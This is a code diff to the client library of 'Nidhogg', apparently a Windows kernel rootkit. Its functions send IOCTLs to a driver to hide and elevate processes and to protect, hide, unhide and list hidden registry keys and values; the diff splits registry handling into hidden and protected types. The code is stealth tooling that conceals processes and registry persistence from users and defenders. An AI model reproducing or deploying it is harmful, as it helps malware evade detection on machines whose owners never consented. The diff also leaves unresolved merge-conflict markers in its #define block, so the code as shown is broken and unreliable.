@@ -53,10 +53,17 @@
 #define MAX_PIDS 256
 #define MAX_FILES 256
 
+<<<<<<< HEAD
 =======
 >>>>>>> 0a9676d (Pre version 0.1 (#6))
 #define REG_TYPE_KEY 0
 #define REG_TYPE_VALUE 1
+=======
+#define REG_TYPE_PROTECTED_KEY 0
+#define REG_TYPE_PROTECTED_VALUE 1
+#define REG_TYPE_HIDDEN_KEY 2
+#define REG_TYPE_HIDDEN_VALUE 3
+>>>>>>> c5ff028 (Seperated hidden and protected registry items)
 #define REG_KEY_LEN 255
 #define REG_VALUE_LEN 260
 #define HKLM_HIVE LR"(\Registry\Machine)"
@@ -191,7 +198,7 @@ std::wstring ParseRegistryKey(wchar_t* key) {
     return result;
 }
 
-int NidhoggProcessProtect(std::vector<DWORD> pids) {
+int NidhoggProcessProtect(DWORD pid) {
     DWORD returned;
     HANDLE hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
 
@@ -199,7 +206,7 @@ int NidhoggProcessProtect(std::vector<DWORD> pids) {
         return NIDHOGG_ERROR_CONNECT_DRIVER;
 
     if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_PROTECT_PROCESS,
-        pids.data(), static_cast<DWORD>(pids.size()) * sizeof(DWORD),
+        &pid, sizeof(pid),
         nullptr, 0, &returned, nullptr)) {
         CloseHandle(hFile);
         return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
@@ -209,7 +216,7 @@ int NidhoggProcessProtect(std::vector<DWORD> pids) {
     return NIDHOGG_SUCCESS;
 }
 
-int NidhoggProcessUnprotect(std::vector<DWORD> pids) {
+int NidhoggProcessUnprotect(DWORD pid) {
     DWORD returned;
     HANDLE hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
 
@@ -217,7 +224,7 @@ int NidhoggProcessUnprotect(std::vector<DWORD> pids) {
         return NIDHOGG_ERROR_CONNECT_DRIVER;
 
     if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_UNPROTECT_PROCESS,
-        pids.data(), static_cast<DWORD>(pids.size()) * sizeof(DWORD),
+        &pid, sizeof(pid),
         nullptr, 0, &returned, nullptr)) {
 
         CloseHandle(hFile);
@@ -245,7 +252,7 @@ int NidhoggProcessClearAllProtection() {
     return NIDHOGG_SUCCESS;
 }
 
-int NidhoggProcessHide(std::vector<DWORD> pids) {
+int NidhoggProcessHide(DWORD pid) {
     DWORD returned;
     HANDLE hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
 
@@ -253,7 +260,7 @@ int NidhoggProcessHide(std::vector<DWORD> pids) {
         return NIDHOGG_ERROR_CONNECT_DRIVER;
 
     if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_HIDE_PROCESS,
-        pids.data(), static_cast<DWORD>(pids.size()) * sizeof(DWORD),
+        &pid, sizeof(pid),
         nullptr, 0, &returned, nullptr)) {
 
         CloseHandle(hFile);
@@ -264,7 +271,7 @@ int NidhoggProcessHide(std::vector<DWORD> pids) {
     return NIDHOGG_SUCCESS;
 }
 
-int NidhoggProcessElevate(std::vector<DWORD> pids) {
+int NidhoggProcessElevate(DWORD pid) {
     DWORD returned;
     HANDLE hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
 
@@ -272,7 +279,7 @@ int NidhoggProcessElevate(std::vector<DWORD> pids) {
         return NIDHOGG_ERROR_CONNECT_DRIVER;
 
     if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_ELEVATE_PROCESS,
-        pids.data(), static_cast<DWORD>(pids.size()) * sizeof(DWORD),
+        &pid, sizeof(pid),
         nullptr, 0, &returned, nullptr)) {
 
         CloseHandle(hFile);
@@ -432,7 +439,37 @@ int NidhoggRegistryProtectKey(wchar_t* key) {
         return NIDHOGG_ERROR_CONNECT_DRIVER;
 
     wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
-    item.Type = REG_TYPE_KEY;
+    item.Type = REG_TYPE_PROTECTED_KEY;
+
+    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_PROTECT_REGITEM,
+        &item, sizeof(item),
+        nullptr, 0, &returned, nullptr)) {
+
+        CloseHandle(hFile);
+        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
+    }
+
+    CloseHandle(hFile);
+    return NIDHOGG_SUCCESS;
+}
+
+int NidhoggRegistryHideKey(wchar_t* key) {
+    HANDLE hFile;
+    DWORD returned;
+    RegItem item;
+    std::wstring kernelSyntaxRegistryKey = ParseRegistryKey(key);
+
+    if (kernelSyntaxRegistryKey.empty()) {
+        return NIDHOGG_GENERAL_ERROR;
+    }
+
+    hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
+
+    if (hFile == INVALID_HANDLE_VALUE)
+        return NIDHOGG_ERROR_CONNECT_DRIVER;
+
+    wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
+    item.Type = REG_TYPE_HIDDEN_KEY;
 
     if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_PROTECT_REGITEM,
         &item, sizeof(item),
@@ -463,7 +500,39 @@ int NidhoggRegistryProtectValue(wchar_t* key, wchar_t* valueName) {
 
     wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
     wcscpy_s(item.ValueName, wcslen(valueName) + 1, valueName);
-    item.Type = REG_TYPE_VALUE;
+    item.Type = REG_TYPE_PROTECTED_VALUE;
+
+    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_PROTECT_REGITEM,
+        &item, sizeof(item),
+        nullptr, 0, &returned, nullptr)) {
+
+        CloseHandle(hFile);
+        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
+    }
+
+
+    CloseHandle(hFile);
+    return NIDHOGG_SUCCESS;
+}
+
+int NidhoggRegistryHideValue(wchar_t* key, wchar_t* valueName) {
+    HANDLE hFile;
+    DWORD returned;
+    RegItem item;
+    std::wstring kernelSyntaxRegistryKey = ParseRegistryKey(key);
+
+    if (kernelSyntaxRegistryKey.empty()) {
+        return NIDHOGG_GENERAL_ERROR;
+    }
+
+    hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
+
+    if (hFile == INVALID_HANDLE_VALUE)
+        return NIDHOGG_ERROR_CONNECT_DRIVER;
+
+    wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
+    wcscpy_s(item.ValueName, wcslen(valueName) + 1, valueName);
+    item.Type = REG_TYPE_HIDDEN_VALUE;
 
     if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_PROTECT_REGITEM,
         &item, sizeof(item),
@@ -494,7 +563,7 @@ int NidhoggRegistryUnprotectKey(wchar_t* key) {
         return NIDHOGG_ERROR_CONNECT_DRIVER;
 
     wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
-    item.Type = REG_TYPE_KEY;
+    item.Type = REG_TYPE_PROTECTED_KEY;
 
     if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_UNPROTECT_REGITEM,
         &item, sizeof(item),
@@ -505,6 +574,35 @@ int NidhoggRegistryUnprotectKey(wchar_t* key) {
     }
 
     CloseHandle(hFile);
+    return NIDHOGG_SUCCESS;
+}
+
+int NidhoggRegistryUnhideKey(wchar_t* key) {
+    HANDLE hFile;
+    DWORD returned;
+    RegItem item;
+    std::wstring kernelSyntaxRegistryKey = ParseRegistryKey(key);
+
+    if (kernelSyntaxRegistryKey.empty()) {
+        return NIDHOGG_GENERAL_ERROR;
+    }
+
+    hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
+
+    if (hFile == INVALID_HANDLE_VALUE)
+        return NIDHOGG_ERROR_CONNECT_DRIVER;
+
+    wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
+    item.Type = REG_TYPE_HIDDEN_KEY;
+
+    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_UNPROTECT_REGITEM,
+        &item, sizeof(item),
+        nullptr, 0, &returned, nullptr)) {
+
+        CloseHandle(hFile);
+        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
+    }
+
     return NIDHOGG_SUCCESS;
 }
 
@@ -525,7 +623,7 @@ int NidhoggRegistryUnprotectValue(wchar_t* key, wchar_t* valueName) {
 
     wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
     wcscpy_s(item.ValueName, wcslen(valueName) + 1, valueName);
-    item.Type = REG_TYPE_VALUE;
+    item.Type = REG_TYPE_PROTECTED_VALUE;
 
     if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_UNPROTECT_REGITEM,
         &item, sizeof(item),
@@ -534,13 +632,43 @@ int NidhoggRegistryUnprotectValue(wchar_t* key, wchar_t* valueName) {
         CloseHandle(hFile);
         return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
     }
-        
 
     CloseHandle(hFile);
     return NIDHOGG_SUCCESS;
 }
 
-int NidhoggRegistryClearAllProtection() {
+int NidhoggRegistryUnhideValue(wchar_t* key, wchar_t* valueName) {
+    HANDLE hFile;
+    DWORD returned;
+    RegItem item;
+    std::wstring kernelSyntaxRegistryKey = ParseRegistryKey(key);
+
+    if (kernelSyntaxRegistryKey.empty()) {
+        return NIDHOGG_GENERAL_ERROR;
+    }
+
+    hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
+
+    if (hFile == INVALID_HANDLE_VALUE)
+        return NIDHOGG_ERROR_CONNECT_DRIVER;
+
+    wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
+    wcscpy_s(item.ValueName, wcslen(valueName) + 1, valueName);
+    item.Type = REG_TYPE_HIDDEN_VALUE;
+
+    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_UNPROTECT_REGITEM,
+        &item, sizeof(item),
+        nullptr, 0, &returned, nullptr)) {
+
+        CloseHandle(hFile);
+        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
+    }
+
+    CloseHandle(hFile);
+    return NIDHOGG_SUCCESS;
+}
+
+int NidhoggRegistryClearAll() {
     DWORD returned;
     HANDLE hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
 
@@ -557,7 +685,7 @@ int NidhoggRegistryClearAllProtection() {
     return NIDHOGG_SUCCESS;
 }
 
-std::vector<std::wstring> NidhoggRegistryQueryKey() {
+std::vector<std::wstring> NidhoggRegistryQueryProtectedKeys() {
     RegItem result{};
     std::vector<std::wstring> keys;
     int amountOfKeys = 0;
@@ -570,10 +698,10 @@ std::vector<std::wstring> NidhoggRegistryQueryKey() {
         return keys;
     }
     result.RegItemsIndex = 0;
-    result.Type = REG_TYPE_KEY;
+    result.Type = REG_TYPE_PROTECTED_KEY;
 
     if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_QUERY_REGITEMS,
-        nullptr, 0,
+        &result, sizeof(result),
         &result, sizeof(result), &returned, nullptr)) {
         keys.push_back(std::to_wstring(NIDHOGG_ERROR_DEVICECONTROL_DRIVER));
         CloseHandle(hFile);
@@ -608,7 +736,58 @@ std::vector<std::wstring> NidhoggRegistryQueryKey() {
     return keys;
 }
 
-std::tuple<std::vector<std::wstring>, std::vector<std::wstring>> NidhoggRegistryQueryValue() {
+std::vector<std::wstring> NidhoggRegistryQueryHiddenKeys() {
+    RegItem result{};
+    std::vector<std::wstring> keys;
+    int amountOfKeys = 0;
+    DWORD returned;
+
+    HANDLE hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
+
+    if (hFile == INVALID_HANDLE_VALUE) {
+        keys.push_back(std::to_wstring(NIDHOGG_ERROR_CONNECT_DRIVER));
+        return keys;
+    }
+    result.RegItemsIndex = 0;
+    result.Type = REG_TYPE_HIDDEN_KEY;
+
+    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_QUERY_REGITEMS,
+        &result, sizeof(result),
+        &result, sizeof(result), &returned, nullptr)) {
+        keys.push_back(std::to_wstring(NIDHOGG_ERROR_DEVICECONTROL_DRIVER));
+        CloseHandle(hFile);
+        return keys;
+    }
+
+    amountOfKeys = result.RegItemsIndex;
+
+    if (amountOfKeys == 0)
+        return keys;
+
+    keys.push_back(std::wstring(result.KeyPath));
+    result.KeyPath[0] = L'\0';
+
+    for (int i = 1; i < amountOfKeys; i++) {
+        result.RegItemsIndex = i;
+
+        if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_QUERY_REGITEMS,
+            nullptr, 0,
+            &result, sizeof(result), &returned, nullptr)) {
+            keys.clear();
+            keys.push_back(std::to_wstring(NIDHOGG_ERROR_DEVICECONTROL_DRIVER));
+            CloseHandle(hFile);
+            return keys;
+        }
+
+        keys.push_back(std::wstring(result.KeyPath));
+        result.KeyPath[0] = L'\0';
+    }
+
+    CloseHandle(hFile);
+    return keys;
+}
+
+std::tuple<std::vector<std::wstring>, std::vector<std::wstring>> NidhoggRegistryQueryProtectedValues() {
     RegItem result{};
     std::vector<std::wstring> values;
     std::vector<std::wstring> valuesKeys;
@@ -623,7 +802,7 @@ std::tuple<std::vector<std::wstring>, std::vector<std::wstring>> NidhoggRegistry
     }
 
     result.RegItemsIndex = 0;
-    result.Type = REG_TYPE_VALUE;
+    result.Type = REG_TYPE_PROTECTED_VALUE;
 
     if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_QUERY_REGITEMS,
         &result, sizeof(result),
@@ -632,6 +811,65 @@ std::tuple<std::vector<std::wstring>, std::vector<std::wstring>> NidhoggRegistry
         values.push_back(std::to_wstring(NIDHOGG_ERROR_DEVICECONTROL_DRIVER));
         CloseHandle(hFile);
         return { values, valuesKeys};
+    }
+
+    amountOfValues = result.RegItemsIndex;
+
+    if (amountOfValues == 0)
+        return { values, valuesKeys };
+
+    valuesKeys.push_back(std::wstring(result.KeyPath));
+    values.push_back(std::wstring(result.ValueName));
+    result.KeyPath[0] = L'\0';
+    result.ValueName[0] = L'\0';
+
+    for (int i = 1; i < amountOfValues; i++) {
+        result.RegItemsIndex = i;
+
+        if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_QUERY_REGITEMS,
+            nullptr, 0,
+            &result, sizeof(result), &returned, nullptr)) {
+            values.clear();
+            valuesKeys.clear();
+            values.push_back(std::to_wstring(NIDHOGG_ERROR_DEVICECONTROL_DRIVER));
+            CloseHandle(hFile);
+            return { values, valuesKeys };
+        }
+
+        valuesKeys.push_back(std::wstring(result.KeyPath));
+        values.push_back(std::wstring(result.ValueName));
+        result.KeyPath[0] = L'\0';
+        result.ValueName[0] = L'\0';
+    }
+
+    CloseHandle(hFile);
+    return { values, valuesKeys };
+}
+
+std::tuple<std::vector<std::wstring>, std::vector<std::wstring>> NidhoggRegistryQueryHiddenValues() {
+    RegItem result{};
+    std::vector<std::wstring> values;
+    std::vector<std::wstring> valuesKeys;
+    int amountOfValues = 0;
+    DWORD returned;
+
+    HANDLE hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
+
+    if (hFile == INVALID_HANDLE_VALUE) {
+        values.push_back(std::to_wstring(NIDHOGG_ERROR_CONNECT_DRIVER));
+        return { values, valuesKeys };
+    }
+
+    result.RegItemsIndex = 0;
+    result.Type = REG_TYPE_HIDDEN_VALUE;
+
+    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_QUERY_REGITEMS,
+        &result, sizeof(result),
+        &result, sizeof(result), &returned, nullptr)) {
+        values.clear();
+        values.push_back(std::to_wstring(NIDHOGG_ERROR_DEVICECONTROL_DRIVER));
+        CloseHandle(hFile);
+        return { values, valuesKeys };
     }
 
     amountOfValues = result.RegItemsIndex;
